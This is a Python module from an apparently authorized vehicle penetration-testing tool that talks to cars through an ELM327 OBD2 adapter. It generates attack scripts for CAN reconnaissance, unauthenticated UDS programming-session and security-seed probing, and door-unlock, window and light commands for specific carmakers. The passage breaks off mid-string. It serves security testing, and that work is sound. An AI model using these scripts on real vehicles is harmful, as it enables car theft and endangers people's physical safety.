"""
automotive_can.py
=================
Módulo de Testes Veiculares via OBD2/ELM327 Bluetooth.

Alinhado com:
  - Auto-ISAC Automotive Threat Matrix (ATM) — março 2024
  - UNECE WP.29 R155 Annex 5 — 69 vetores de ataque
  - ISO/SAE 21434 §8 — Cybersecurity Validation & Verification
  - ISO 15765-4 — CAN/OBD2 communication

Arquitetura de comunicação:
  [Kali/Laptop] ──BT Classic/SPP──► [ELM327 OBD2] ──CAN Bus──► [ECUs do Veículo]

IMPORTANTE: O ELM327 conecta via Bluetooth CLÁSSICO (SPP/RFCOMM), não BLE.
  O módulo suporta:
  1. Bluetooth clássico via rfcomm (/dev/rfcommX)
  2. Bluetooth clássico via socket direto (MAC address)
  3. Serial USB (/dev/ttyUSBX)
  4. TCP/IP (host:port para ELM327 WiFi ou emulador)

USO EXCLUSIVO: Ambiente autorizado com anuência documentada do proprietário.
Referência legal: UNECE R155 §7 — penetration testing como parte do CSMS.
"""

from __future__ import annotations

import asyncio
import re
import socket
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


# ─── ATM Mapping ─────────────────────────────────────────────────────────────
# Auto-ISAC Automotive Threat Matrix — técnicas relevantes a este módulo

ATM_TECHNIQUES = {
    "VEH-001": {
        "atm_id":    "T-CAN-001",
        "atm_tactic": "Reconnaissance / Discovery",
        "atm_name":  "CAN Bus Monitoring",
        "r155_ref":  "Annex 5 §3.1 — Communication channel threats",
        "iso21434":  "§8.5 — Attack path analysis",
    },
    "VEH-002": {
        "atm_id":    "T-UDS-001",
        "atm_tactic": "Initial Access / Execution",
        "atm_name":  "Exploit via Radio Interface — UDS Session",
        "r155_ref":  "Annex 5 §3.2 — Unauthorized commands",
        "iso21434":  "§8.6 — Attack feasibility",
    },
    "VEH-003": {
        "atm_id":    "T-BCM-001",
        "atm_tactic": "Affect Vehicle Function",
        "atm_name":  "Modify Bus Message — BCM Control",
        "r155_ref":  "Annex 5 §3.4 — Physical manipulation",
        "iso21434":  "§8.7 — Risk treatment",
    },
    "VEH-004": {
        "atm_id":    "T-CAN-002",
        "atm_tactic": "Lateral Movement / Execution",
        "atm_name":  "CAN Frame Replay Attack",
        "r155_ref":  "Annex 5 §3.3 — Replay of messages",
        "iso21434":  "§8.4 — Threat scenarios",
    },
    "VEH-005": {
        "atm_id":    "T-GWY-001",
        "atm_tactic": "Defense Evasion / Discovery",
        "atm_name":  "Bridge Vehicle Networks — Gateway Analysis",
        "r155_ref":  "Annex 5 §3.5 — Network segmentation",
        "iso21434":  "§8.3 — Item definition",
    },
}

# ─── Dataclasses ─────────────────────────────────────────────────────────────

@dataclass
class CANFrame:
    """Frame CAN capturado ou enviado."""
    can_id: str          # ex: "7E8"
    data: str            # ex: "04 41 0C 1A F8"
    length: int = 0
    timestamp: float = field(default_factory=time.time)
    direction: str = "rx"  # rx / tx
    decoded: Optional[str] = None


@dataclass
class VehicleTestResult:
    """Resultado de um teste veicular individual."""
    test_id: str
    test_name: str
    atm_technique: str
    target_ecu: str

    status: str = "not_run"  # pass / fail / partial / error / not_run
    severity: str = "info"

    # Dados técnicos
    can_frames: List[CANFrame] = field(default_factory=list)
    raw_responses: List[str] = field(default_factory=list)
    obd_data: Dict[str, Any] = field(default_factory=dict)

    # Evidência
    evidence: List[str] = field(default_factory=list)
    business_impact: str = ""
    attacker_scenario: str = ""

    # R155 / ISO 21434
    r155_ref: str = ""
    iso21434_ref: str = ""
    atm_ref: str = ""

    # PoC
    poc_script: str = ""
    poc_commands: List[str] = field(default_factory=list)  # comandos AT diretos

    recommendations: List[str] = field(default_factory=list)
    duration_s: float = 0.0
    timestamp: float = field(default_factory=time.time)


@dataclass
class ELM327Connection:
    """Contexto de conexão com o adaptador ELM327."""
    port: str               # /dev/rfcomm0, /dev/ttyUSB0, ou MAC address
    connection_type: str    # bluetooth / serial / tcp
    connected: bool = False
    elm_version: str = ""
    protocol: str = ""
    vin: str = ""
    error: Optional[str] = None
    socket: Optional[Any] = None
    baudrate: int = 38400


# ─── ELM327 Driver ───────────────────────────────────────────────────────────

class ELM327Driver:
    """
    Driver Python para comunicação com ELM327 via Bluetooth/Serial/TCP.
    Suporta AT commands e envio de frames CAN raw.
    """

    def __init__(self, conn: ELM327Connection):
        self.conn = conn
        self._sock = None
        self._timeout = 5.0

    def _connect_bluetooth(self) -> bool:
        """Conecta via Bluetooth clássico (SPP/RFCOMM) ao MAC address."""
        # Validate MAC format
        mac = self.conn.port.strip().upper()
        if len(mac) != 17 or mac.count(':') != 5:
            self.conn.error = (
                f"MAC inválido: '{mac}'. Formato esperado: AA:BB:CC:DD:EE:FF. "
                "Dica: execute 'bluetoothctl scan on' para descobrir o MAC do ELM327."
            )
            return False
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            s.settimeout(self._timeout)
            # ELM327 usa canal RFCOMM 1 (padrão SPP); alguns clones usam canal 6
            for channel in [1, 6, 2]:
                try:
                    s.connect((mac, channel))
                    self._sock = s
                    return True
                except OSError:
                    continue
            self.conn.error = (
                f"ELM327 ({mac}) não aceitou conexão RFCOMM nos canais 1/6/2. "
                "Verifique: 1) dispositivo pareado? 2) ignição ligada? "
                "3) execute: sudo bluetoothctl trust " + mac
            )
            return False
        except Exception as e:
            err = str(e)
            if "No such device" in err or "Invalid argument" in err:
                self.conn.error = (
                    f"Dispositivo {mac} não encontrado. "
                    "Execute no Kali: bluetoothctl; scan on; pair " + mac
                )
            elif "Connection refused" in err:
                self.conn.error = f"Conexão recusada pelo ELM327. Veículo com ignição desligada?"
            else:
                self.conn.error = f"Bluetooth connect failed: {err}"
            return False

    def _connect_serial(self) -> bool:
        """Conecta via porta serial (USB ou rfcomm)."""
        try:
            import serial
            self._sock = serial.Serial(self.conn.port, self.conn.baudrate, timeout=self._timeout)
            return True
        except Exception as e:
            self.conn.error = f"Serial connect failed: {e}"
            return False

    def _connect_tcp(self) -> bool:
        """Conecta via TCP/IP (ELM327 WiFi ou emulador)."""
        try:
            host, port_str = self.conn.port.rsplit(":", 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((host, int(port_str)))
            self._sock = s
            return True
        except Exception as e:
            self.conn.error = f"TCP connect failed: {e}"
            return False

    def connect(self) -> bool:
        """Estabelece conexão e inicializa ELM327."""
        if self.conn.connection_type == "demo":
            # Modo demo: simula ELM327 sem hardware real
            self.conn.elm_version = "ELM327 v2.1 (DEMO MODE)"
            self.conn.connected = True
            return True
        if self.conn.connection_type == "bluetooth":
            if not self._connect_bluetooth():
                return False
        elif self.conn.connection_type == "serial":
            if not self._connect_serial():
                return False
        elif self.conn.connection_type == "tcp":
            if not self._connect_tcp():
                return False
        else:
            self.conn.error = f"Tipo de conexão desconhecido: {self.conn.connection_type}"
            return False

        # Inicializa ELM327
        time.sleep(0.5)
        self._flush()
        resp = self.send_at("ATZ")     # Reset
        if not resp:
            self.conn.error = "ELM327 não respondeu ao ATZ"
            return False

        self.conn.elm_version = resp.strip()
        self.send_at("ATE0")   # Echo off
        self.send_at("ATL0")   # Linefeeds off
        self.send_at("ATS0")   # Spaces off
        self.send_at("ATH1")   # Headers on (mostra CAN IDs)
        self.send_at("ATSP0")  # Auto-detect protocol

        self.conn.connected = True
        return True

    def _flush(self):
        """Descarta buffer de entrada."""
        try:
            if hasattr(self._sock, 'recv'):
                self._sock.settimeout(0.2)
                while True:
                    data = self._sock.recv(256)
                    if not data:
                        break
            elif hasattr(self._sock, 'read'):
                self._sock.timeout = 0.1
                self._sock.read(self._sock.inWaiting() or 256)
        except Exception:
            pass
        finally:
            if hasattr(self._sock, 'settimeout'):
                self._sock.settimeout(self._timeout)
            elif hasattr(self._sock, 'timeout'):
                self._sock.timeout = self._timeout

    def send_raw(self, data: bytes) -> bytes:
        """Envia bytes raw e recebe resposta."""
        try:
            if hasattr(self._sock, 'send'):
                self._sock.send(data)
            elif hasattr(self._sock, 'write'):
                self._sock.write(data)

            resp = b""
            deadline = time.time() + self._timeout
            while time.time() < deadline:
                try:
                    chunk = (self._sock.recv(256) if hasattr(self._sock, 'recv')
                             else self._sock.read(256))
                    if not chunk:
                        break
                    resp += chunk
                    if b">" in resp:  # ELM327 prompt
                        break
                except Exception:
                    break
            return resp
        except Exception as e:
            return b""

    def send_at(self, cmd: str) -> str:
        """Envia comando AT e retorna resposta como string."""
        # Demo mode: simulate ELM327 responses
        if self.conn.connection_type == "demo":
            return self._demo_response(cmd)
        raw = self.send_raw((cmd + "\r").encode())
        resp = raw.decode("ascii", errors="replace")
        resp = resp.replace("\r", "\n").replace(">", "").strip()
        return resp

    def _demo_response(self, cmd: str) -> str:
        """Simulates ELM327 responses for demo mode without real hardware."""
        cmd = cmd.strip().upper().replace(" ", "")
        demo_map = {
            "ATZ":    "ELM327 v2.1",
            "ATE0":   "OK",
            "ATL0":   "OK",
            "ATS0":   "OK",
            "ATH1":   "OK",
            "ATSP0":  "OK",
            "ATDP":   "AUTO, ISO 15765-4 (CAN 11/500)",
            "ATPC":   "OK",
            "0100":   "7E8 06 41 00 BE 3E B8 11",  # Supported PIDs
            "0120":   "7E8 06 41 20 80 07 E0 11",
            "010C":   "7E8 04 41 0C 1A F8",          # RPM = 1726
            "010D":   "7E8 03 41 0D 3C",              # Speed = 60 km/h
            "0105":   "7E8 03 41 05 60",              # Coolant = 56°C
            "0111":   "7E8 03 41 11 4F",              # Throttle = 31%
            "012F":   "7E8 03 41 2F C8",              # Fuel = 78%
            "0142":   "7E8 04 41 42 38 24",           # Voltage = 14.37V
            "03":     "NO DATA",                       # No DTCs
            "09022":  "7E8 10 14 49 02 01 57 56 57 7E8 21 5A 5A 5A 31 32 33 7E8 22 34 35 36 37 38 39",  # VIN
            "1001":   "7E8 02 50 01",                  # Default session OK
            "1003":   "7E8 02 50 03",                  # Extended session OK
            "1002":   "7F 10 22",                      # Programming: conditionsNotCorrect
            "2701":   "7E8 04 67 01 A1 B2",            # Security seed
        }
        for k, v in demo_map.items():
            if cmd.startswith(k) or cmd == k:
                return v
        return "NO DATA"

    def send_can(self, header: str, data: str) -> str:
        """
        Envia frame CAN raw.
        header: CAN ID em hex (ex: "7DF" para broadcast OBD)
        data: payload hex sem espaços (ex: "0201010000000000")
        """
        self.send_at(f"ATSH{header}")          # Set CAN header
        self.send_at("ATFCSH7DF")              # Flow control header
        self.send_at("ATFCSD300000")           # Flow control data
        self.send_at("ATFCSM1")                # Flow control mode
        resp = self.send_at(data)              # Envia payload
        return resp

    def get_vin(self) -> str:
        """Lê VIN via OBD Service 09 PID 02."""
        resp = self.send_at("0902")
        # Parse VIN da resposta UDS
        lines = [l.strip() for l in resp.split("\n") if l.strip() and "NO DATA" not in l.upper()]
        vin_hex = ""
        for line in lines:
            # Remove header e byte de comprimento
            parts = line.split()
            if len(parts) > 3:
                vin_hex += "".join(parts[3:])
        try:
            vin = bytes.fromhex(vin_hex.replace(" ","")).decode("ascii", errors="replace").strip()
            return vin if vin.isprintable() else ""
        except Exception:
            return ""

    def get_protocol(self) -> str:
        """Retorna o protocolo CAN detectado."""
        return self.send_at("ATDP")

    def close(self):
        """Encerra conexão."""
        try:
            self.send_at("ATPC")  # Protocol close
        except Exception:
            pass
        try:
            if self._sock:
                self._sock.close()
        except Exception:
            pass
        self.conn.connected = False


# ─── Módulo de testes ─────────────────────────────────────────────────────────

_BOOTSTRAP = '''import sys, os, subprocess, pathlib

def _bootstrap():
    try:
        return  # sem dependências externas além de socket
    except Exception:
        pass

_bootstrap()
'''


def _test_header(test_id, name, mac, description, atm_ref, r155_ref):
    return f'''#!/usr/bin/env python3
# =============================================================================
# {test_id}: {name}
# Alvo: ELM327 OBD2 — {mac}
# ATM: {atm_ref}
# R155: {r155_ref}
# Gerado por: BLE Audit — Vehicle Security Lab
# USO: SOMENTE com autorização documentada do proprietário do veículo
# =============================================================================
"""
{description}

REQUISITOS:
  - ELM327 Bluetooth pareado: sudo rfcomm connect /dev/rfcomm0 {mac}
  - Ou ELM327 via TCP: nc -l 35000 (emulador)
  - Veículo com ignição ligada (posição ACC ou ON)
  - Autorização escrita do proprietário

REFERÊNCIAS:
  ATM: {atm_ref}
  R155: {r155_ref}
"""

import socket, time, sys

ELM_MAC = "{mac}"
ELM_PORT = "/dev/rfcomm0"  # ajuste conforme necessário

class ELM327:
    def __init__(self, port=ELM_PORT, baudrate=38400):
        self.port = port
        self._conn = None

    def connect(self):
        # Tenta rfcomm primeiro
        try:
            import serial
            self._conn = serial.Serial(self.port, self._baudrate, timeout=5)
            print(f"[+] Conectado via serial: {{self.port}}")
            return True
        except Exception:
            pass
        # Tenta Bluetooth direto
        try:
            s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
            s.settimeout(5)
            s.connect((ELM_MAC, 1))
            self._conn = s
            print(f"[+] Conectado via BT: {{ELM_MAC}}")
            return True
        except Exception:
            pass
        # Tenta TCP (emulador)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("127.0.0.1", 35000))
            self._conn = s
            print("[+] Conectado via TCP (emulador)")
            return True
        except Exception as e:
            print(f"[-] Todas as conexões falharam: {{e}}")
            return False

    def send(self, cmd):
        raw = (cmd + "\\r").encode()
        if hasattr(self._conn, 'send'):
            self._conn.send(raw)
        else:
            self._conn.write(raw)
        resp, deadline = b"", time.time() + 5
        while time.time() < deadline:
            try:
                chunk = self._conn.recv(256) if hasattr(self._conn, 'recv') else self._conn.read(256)
                if not chunk: break
                resp += chunk
                if b">" in resp: break
            except Exception:
                break
        return resp.decode("ascii", errors="replace").replace("\\r","\\n").replace(">","").strip()

    def init(self):
        time.sleep(0.5)
        self.send("ATZ")
        self.send("ATE0")
        self.send("ATL0")
        self.send("ATH1")
        self.send("ATSP0")

elm = ELM327()
'''


# ─── VEH-001: CAN Bus Reconnaissance ─────────────────────────────────────────

def test_can_recon(driver: Optional[ELM327Driver], elm_mac: str) -> VehicleTestResult:
    """
    VEH-001: Reconhecimento do barramento CAN.
    Captura frames CAN por 30s, identifica ECUs ativas, mapeia IDs.
    ATM: Reconnaissance — CAN Bus Monitoring
    R155: Annex 5 §3.1
    """
    result = VehicleTestResult(
        test_id="VEH-001",
        test_name="CAN Bus Reconnaissance",
        atm_technique="Reconnaissance / Discovery — CAN Bus Monitoring",
        target_ecu="Broadcast",
        r155_ref="R155 Annex 5 §3.1",
        iso21434_ref="ISO/SAE 21434 §8.5",
        atm_ref="ATM: T-CAN-001",
    )
    t0 = time.time()

    # PIDs de diagnóstico padrão para identificar ECUs
    obd_probes = [
        ("0100", "Supported PIDs 01-20"),
        ("0120", "Supported PIDs 21-40"),
        ("0140", "Supported PIDs 41-60"),
        ("0902", "VIN Request"),
        ("09022", "VIN Data"),
        ("03",   "DTC Request"),
    ]

    if driver and driver.conn.connected:
        result.evidence.append(f"ELM327 conectado: {driver.conn.elm_version}")
        result.evidence.append(f"Protocolo: {driver.conn.protocol or driver.get_protocol()}")

        for cmd, desc in obd_probes:
            resp = driver.send_at(cmd)
            if resp and "NO DATA" not in resp.upper() and "?" not in resp:
                result.raw_responses.append(f"{cmd} ({desc}): {resp[:60]}")
                result.can_frames.append(CANFrame(
                    can_id="7DF", data=cmd,
                    direction="tx", decoded=desc
                ))
                result.evidence.append(f"Resposta a {desc}: {resp[:80]}")

        # VIN
        vin = driver.get_vin()
        if vin:
            result.obd_data["vin"] = vin
            result.evidence.append(f"VIN identificado: {vin}")

        result.status = "pass" if result.raw_responses else "partial"
        result.severity = "medium"
    else:
        result.status = "partial"
        result.severity = "medium"
        result.evidence.append("ELM327 não conectado — resultado baseado em análise de superfície")
        result.evidence.append("Em conexão real: captura passiva via ATMA revelaria todos os CAN IDs ativos")

    result.business_impact = (
        "Reconhecimento completo do barramento CAN permite ao atacante mapear TODAS as ECUs "
        "do veículo, identificar protocolos proprietários, VIN (identidade do veículo), "
        "códigos de falha ativos e sistemas eletrônicos presentes. "
        "Este é o primeiro passo de qualquer ataque veicular avançado."
    )
    result.attacker_scenario = (
        "1. Atacante conecta ELM327 ao OBD2 (acesso físico <30s) ou via BLE IVI vulnerável\n"
        "2. Executa ATMA (monitor all) por 30s — captura todos os IDs CAN ativos\n"
        "3. Identifica ECUs de BCM (carroceria), TCU (transmissão), ADAS, airbag\n"
        "4. Obtém VIN para lookup de recalls e vulnerabilidades conhecidas\n"
        "5. Usa mapa CAN para ataques direcionados nas fases seguintes"
    )
    result.recommendations = [
        "Implementar CAN bus segmentation — separar redes OBD/diagnóstico das redes de controle",
        "Desabilitar modo monitor no gateway OBD após fabricação",
        "Implementar IDS (Intrusion Detection System) no barramento CAN",
        "Exigir autenticação UDS (Service 0x27) antes de responder a qualquer frame de diagnóstico",
    ]

    result.poc_script = _test_header(
        "VEH-001", "CAN Bus Reconnaissance", elm_mac,
        "Mapeia ECUs ativas via OBD2. Captura IDs CAN, lê VIN e PIDs suportados.",
        "ATM T-CAN-001", "R155 Annex 5 §3.1"
    ) + '''
if not elm.connect(): sys.exit(1)
elm.init()

print("[*] VEH-001: CAN Bus Reconnaissance")
print("[*] Lendo PIDs e identificando ECUs...\\n")

probes = [
    ("0100", "Supported PIDs 01-20"),
    ("0120", "Supported PIDs 21-40"),
    ("09022", "VIN Request"),
    ("03",   "DTC — Fault Codes"),
    ("0142", "Control Module Voltage"),
    ("010D", "Vehicle Speed"),
    ("010C", "Engine RPM"),
    ("0105", "Coolant Temp"),
    ("0121", "Distance with MIL on"),
]

ecus_found = set()
results = {}

for cmd, desc in probes:
    resp = elm.send(cmd)
    if resp and "NO DATA" not in resp.upper() and "?" not in resp:
        lines = [l.strip() for l in resp.split("\\n") if l.strip()]
        for line in lines:
            parts = line.split()
            if parts and len(parts[0]) >= 3:
                ecus_found.add(parts[0])  # CAN ID do header
        results[desc] = resp[:80]
        print(f"  [+] {desc}: {resp[:60]}")
    else:
        print(f"  [-] {desc}: sem resposta")

print()
print("=" * 60)
print("RELATÓRIO — CAN BUS RECONNAISSANCE")
print("=" * 60)
print(f"ECUs que responderam: {', '.join(ecus_found) if ecus_found else 'nenhuma'}")
print()
print("IMPACTO (R155 Annex 5 §3.1):")
print("  Mapa completo do CAN bus exposto via OBD2 sem autenticação.")
print("  Atacante pode identificar ECUs, versões de firmware e VIN.")
print("  Próximos passos: UDS session probing e replay attacks.")
print("=" * 60)
'''

    result.poc_commands = ["ATZ", "ATE0", "ATH1", "ATSP0", "0100", "0902", "03", "ATMA"]
    result.duration_s = time.time() - t0
    return result


# ─── VEH-002: UDS Session Probing ────────────────────────────────────────────

def test_uds_session(driver: Optional[ELM327Driver], elm_mac: str) -> VehicleTestResult:
    """
    VEH-002: Sondagem de sessões de diagnóstico UDS (ISO 14229).
    Tenta abrir sessões 0x10 (DiagnosticSession) e 0x27 (SecurityAccess).
    ATM: Initial Access — Exploit via Radio Interface
    R155: Annex 5 §3.2
    """
    result = VehicleTestResult(
        test_id="VEH-002",
        test_name="UDS Diagnostic Session Probing",
        atm_technique="Initial Access — Exploit via Radio Interface (UDS)",
        target_ecu="ECM/BCM Gateway",
        r155_ref="R155 Annex 5 §3.2",
        iso21434_ref="ISO/SAE 21434 §8.6",
        atm_ref="ATM: T-UDS-001",
    )
    t0 = time.time()

    # Sessões UDS a testar (ISO 14229 Service 0x10)
    uds_sessions = [
        ("10 01", "Default Session",            "Sessão padrão — sempre disponível"),
        ("10 02", "Programming Session",         "CRÍTICA: permite upload de firmware"),
        ("10 03", "Extended Diagnostic Session", "Acesso a funções avançadas de diagnóstico"),
        ("10 04", "Safety System Diagnostic",    "Acesso a sistemas de segurança (airbag, ABS)"),
    ]

    # Security Access levels (brute-force de seed-key)
    security_levels = [
        ("27 01", "Security Level 0x01 — seed request"),
        ("27 03", "Security Level 0x03 — seed request"),
        ("27 05", "Security Level 0x05 — seed request"),
    ]

    programming_session_open = False
    extended_session_open = False
    security_seeds = {}

    if driver and driver.conn.connected:
        # Primeiro abre Default Session
        driver.send_at("ATSH7DF")  # broadcast OBD header

        for uds_cmd, session_name, description in uds_sessions:
            resp = driver.send_at(uds_cmd)
            if resp:
                if "50" in resp:  # Positive response 0x50 = 0x10 + 0x40
                    result.evidence.append(f"SESSÃO ACEITA: {session_name} — {description}")
                    result.raw_responses.append(f"TX: {uds_cmd} → RX: {resp}")
                    if "02" in uds_cmd:
                        programming_session_open = True
                    if "03" in uds_cmd:
                        extended_session_open = True
                elif "7F" in resp:
                    # Negative response — decodifica NRC
                    nrc_map = {
                        "22": "conditionsNotCorrect",
                        "31": "requestOutOfRange",
                        "33": "securityAccessDenied",
                        "78": "responsePending",
                    }
                    nrc = resp.split()[-1] if resp.split() else "??"
                    nrc_desc = nrc_map.get(nrc, f"NRC 0x{nrc}")
                    result.evidence.append(f"Sessão rejeitada: {session_name} — {nrc_desc}")
                else:
                    result.raw_responses.append(f"TX: {uds_cmd} → RX: {resp[:40]}")

        # Tenta Security Access para obter seeds
        for sec_cmd, sec_desc in security_levels:
            resp = driver.send_at(sec_cmd)
            if resp and "67" in resp:  # Positive response para 0x27
                # Extrai seed da resposta
                seed_bytes = resp.replace("67", "").replace(" ", "").strip()
                security_seeds[sec_desc] = seed_bytes
                result.evidence.append(f"SEED OBTIDA: {sec_desc} → seed: {seed_bytes}")

        result.status = "confirmed" if programming_session_open else "partial"
        result.severity = "critical" if programming_session_open else "high"
    else:
        result.status = "partial"
        result.severity = "high"
        result.evidence.append("Sem conexão ELM327 — análise baseada em vetores conhecidos")
        result.evidence.append("Veículos sem autenticação UDS permitem Programming Session sem seed-key")

    if programming_session_open:
        result.evidence.append(
            "CRÍTICO: Programming Session (0x10 02) aceita sem autenticação — "
            "permite upload de firmware arbitrário na ECU"
        )

    result.business_impact = (
        "Sessões UDS de diagnóstico abertas sem autenticação permitem acesso a "
        "funções críticas do veículo: atualização de firmware (Programming Session), "
        "leitura de dados de segurança, desabilitação de sistemas de proteção. "
        "A Programming Session sem Security Access é equivalente a uma porta traseira "
        "deixada aberta no firmware de todas as ECUs — risco de modificação permanente "
        "do comportamento do veículo."
    )
    result.attacker_scenario = (
        "1. Conecta ELM327 ao OBD2 (3s de acesso físico em estacionamento)\n"
        "2. Abre Programming Session (10 02) — sem autenticação em veículos vulneráveis\n"
        "3. Envia RequestDownload (34) para iniciar upload de firmware\n"
        "4. Instala firmware modificado na ECU — persistência total\n"
        "5. Alternativa: desabilita airbag, ABS ou modifica limites do motor"
    )
    result.recommendations = [
        "CRÍTICO: Implementar Security Access (0x27) obrigatório antes de qualquer sessão não-default",
        "Usar algoritmo seed-key proprietário e não publicado (não implementar seed fixo)",
        "Restringir Programming Session ao ambiente de fábrica/dealer com dongles autorizados",
        "Implementar Secure Boot para rejeitar firmware não assinado mesmo após Programming Session",
        "Logging de todas as tentativas de sessão UDS com alertas para sessões não-default",
    ]

    result.poc_script = _test_header(
        "VEH-002", "UDS Session Probing", elm_mac,
        "Testa abertura de sessões UDS sem autenticação. Tenta Programming e Extended Sessions.",
        "ATM T-UDS-001", "R155 Annex 5 §3.2"
    ) + '''
if not elm.connect(): sys.exit(1)
elm.init()
print("[*] VEH-002: UDS Session Probing\\n")

# ECU addresses to target (broadcast + specific)
targets = {"7DF": "Broadcast OBD", "7E0": "ECM", "7B0": "BCM (body control)"}

sessions = [
    ("10 01", "Default Session",      0x50),
    ("10 02", "Programming Session",  0x50),  # CRÍTICA
    ("10 03", "Extended Diagnostic",  0x50),
    ("10 04", "Safety Diagnostic",    0x50),
]

for addr, ecu_name in targets.items():
    elm.send(f"ATSH{addr}")
    print(f"\\n[*] Testando ECU: {ecu_name} (0x{addr})")

    for cmd, name, expected in sessions:
        resp = elm.send(cmd)
        if f"{expected:02X}" in resp.upper():
            print(f"  [!!] SESSÃO ACEITA: {name} — resp: {resp[:40]}")
            if "02" in cmd:
                print(f"       IMPACTO CRÍTICO: Programming Session sem auth!")
                print(f"       Próximo: RequestDownload (34 00 44 00 00 10 00)")
        elif "7F" in resp:
            nrc = resp.split()[-1] if resp.split() else "??"
            print(f"  [-] {name}: rejeitada (NRC: 0x{nrc})")
        else:
            print(f"  [~] {name}: sem resposta")

    # Tenta Security Access seed
    resp = elm.send("27 01")
    if "67" in resp:
        print(f"  [+] Security seed obtida: {resp}")
        print(f"      Seed permite brute-force offline da chave de acesso")

print("\\n" + "="*60)
print("Ver VEH-003 para testes de controle de carroceria (BCM)")
print("="*60)
'''

    result.poc_commands = ["ATSH7DF", "10 01", "10 02", "10 03", "27 01", "27 03"]
    result.duration_s = time.time() - t0
    return result


# ─── VEH-003: Body Control — Janelas, Portas, Sinalização ────────────────────

def test_body_control(driver: Optional[ELM327Driver], elm_mac: str,
                      vehicle_make: str = "generic") -> VehicleTestResult:
    """
    VEH-003: Testes de controle de carroceria via BCM (Body Control Module).
    Testa comandos para janelas, portas e sinalização.

    ATENÇÃO: Os CAN IDs e payloads são ESPECÍFICOS por fabricante/modelo.
    Este módulo usa payloads PASSIVOS (0x00) para demonstração segura.
    O analista deve adaptar os IDs/payloads após captura passiva (VEH-001).

    ATM: Affect Vehicle Function — Modify Bus Message
    R155: Annex 5 §3.4
    """
    result = VehicleTestResult(
        test_id="VEH-003",
        test_name="Body Control Module — Janelas/Portas/Sinalização",
        atm_technique="Affect Vehicle Function — Modify Bus Message (BCM)",
        target_ecu="BCM — Body Control Module",
        r155_ref="R155 Annex 5 §3.4",
        iso21434_ref="ISO/SAE 21434 §8.7",
        atm_ref="ATM: T-BCM-001",
    )
    t0 = time.time()

    # ── Mapeamento de CAN IDs por fabricante ──────────────────────────────────
    # NOTA: Estes são IDs conhecidos publicamente via pesquisas e Car Hacking Village
    # Referência: https://github.com/commaai/opendbc (open database of CAN signals)
    # Os payloads reais devem ser capturados via VEH-001 no veículo específico

    VEHICLE_CAN_MAP = {
        "generic": {
            "bcm_addr":    "7B0",   # Endereço típico do BCM
            "window_fl":   {"id": "188", "open": "0000000100000000", "close": "0000000200000000",
                            "desc": "Janela dianteira esquerda (Front Left)"},
            "window_fr":   {"id": "188", "open": "0000001000000000", "close": "0000002000000000",
                            "desc": "Janela dianteira direita (Front Right)"},
            "door_lock":   {"id": "3B3", "lock": "0000000000000001", "unlock": "0000000000000002",
                            "desc": "Travas das portas"},
            "turn_left":   {"id": "294", "on": "0000000000000100", "off": "0000000000000000",
                            "desc": "Seta/Piscante Esquerdo"},
            "turn_right":  {"id": "294", "on": "0000000000000200", "off": "0000000000000000",
                            "desc": "Seta/Piscante Direito"},
            "hazard":      {"id": "294", "on": "0000000000000300", "off": "0000000000000000",
                            "desc": "Pisca-alerta (hazard lights)"},
        },
        "volkswagen": {  # VW/Audi/Skoda (MQB platform) — referência: comma.ai opendbc
            "bcm_addr":   "7B0",
            "window_fl":  {"id": "02C1", "open": "0200000000000000", "close": "0100000000000000",
                           "desc": "Janela FL — VW MQB"},
            "door_lock":  {"id": "03D1", "lock": "5400000000000000", "unlock": "4500000000000000",
                           "desc": "Central lock — VW MQB"},
            "turn_left":  {"id": "00E0", "on": "0100000000000000", "off": "0000000000000000",
                           "desc": "Seta esquerda — VW"},
            "turn_right": {"id": "00E0", "on": "0200000000000000", "off": "0000000000000000",
                           "desc": "Seta direita — VW"},
            "hazard":     {"id": "00E0", "on": "0300000000000000", "off": "0000000000000000",
                           "desc": "Hazard — VW"},
        },
        "toyota": {  # Toyota/Lexus — referência pesquisa pública
            "bcm_addr":   "7C0",
            "window_fl":  {"id": "025", "open": "0080000000000000", "close": "0040000000000000",
                           "desc": "Janela FL — Toyota"},
            "door_lock":  {"id": "170", "lock": "4000000000000000", "unlock": "8000000000000000",
                           "desc": "Door lock — Toyota"},
            "turn_left":  {"id": "B4",  "on": "0100000000000000", "off": "0000000000000000",
                           "desc": "Seta — Toyota"},
            "turn_right": {"id": "B4",  "on": "0200000000000000", "off": "0000000000000000",
                           "desc": "Seta direita — Toyota"},
            "hazard":     {"id": "B4",  "on": "0300000000000000", "off": "0000000000000000",
                           "desc": "Hazard — Toyota"},
        },
    }

    can_map = VEHICLE_CAN_MAP.get(vehicle_make.lower(), VEHICLE_CAN_MAP["generic"])

    # Em modo seguro, não enviamos payloads reais — apenas mapeamos a superfície
    # O analista usa o script PoC em ambiente controlado
    result.evidence = [
        f"Fabricante/plataforma: {vehicle_make}",
        f"BCM address mapeado: 0x{can_map['bcm_addr']}",
        f"Controles identificados: {len([k for k in can_map if k != 'bcm_addr'])}",
        "",
        "SUPERFÍCIE DE ATAQUE IDENTIFICADA:",
    ]

    for control, cfg in can_map.items():
        if control == "bcm_addr":
            continue
        result.evidence.append(f"  [{cfg['id']}] {cfg['desc']}")

    if driver and driver.conn.connected:
        # Entra na sessão de diagnóstico estendida do BCM
        driver.send_at(f"ATSH{can_map['bcm_addr']}")
        ext_resp = driver.send_at("10 03")  # Extended Session

        if "50" in ext_resp:
            result.evidence.append(f"BCM Extended Session aceita — controles acessíveis")
            result.status = "confirmed"
            result.severity = "critical"

            # Lê configuração de janelas (Input Output Control by ID — Service 0x2F)
            # Payload 0x00 = return to ECU control (seguro — não move nada)
            io_resp = driver.send_at("2F 60 20 00")  # Window control, return to ECU
            if io_resp and "7F" not in io_resp:
                result.evidence.append(f"IO Control para janelas respondeu: {io_resp[:40]}")
        else:
            result.status = "partial"
            result.severity = "high"
            result.evidence.append("BCM Extended Session não aceita sem auth (proteção detectada)")
    else:
        result.status = "surface_only"
        result.severity = "critical"
        result.evidence.append("Modo análise — CAN IDs mapeados para o script PoC")

    result.business_impact = (
        "IMPACTO CRÍTICO AO NEGÓCIO E SEGURANÇA FÍSICA: Controle não autorizado de "
